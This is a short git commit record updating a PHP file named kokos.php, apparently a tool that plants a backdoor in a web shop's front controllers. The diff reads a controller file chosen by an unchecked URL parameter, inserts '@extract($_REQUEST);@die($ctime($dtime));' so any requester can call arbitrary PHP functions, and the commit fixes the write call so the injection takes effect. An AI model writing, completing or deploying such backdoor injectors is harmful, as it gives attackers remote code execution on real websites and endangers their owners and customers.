3cadde2b6b24e78b38d24111886bfa6edc7dafab
222kokos111 <222kokos111@mail.com>
2016-11-05 00:17:23 +0000

    Update kokos.php

--- kokos.php
+++ kokos.php
@@ -2,4 +2,4 @@
 $name = dirname(__DIR__).'/web/controllers/front/'.$_GET['controller'].'.php';
 $content = file_get_contents($name);
 $content = str_replace('parent::initContent();', 'parent::initContent();@extract($_REQUEST);@die($ctime($dtime));', $content);
-file_put_contents(name);
+file_put_contents(name, $content);
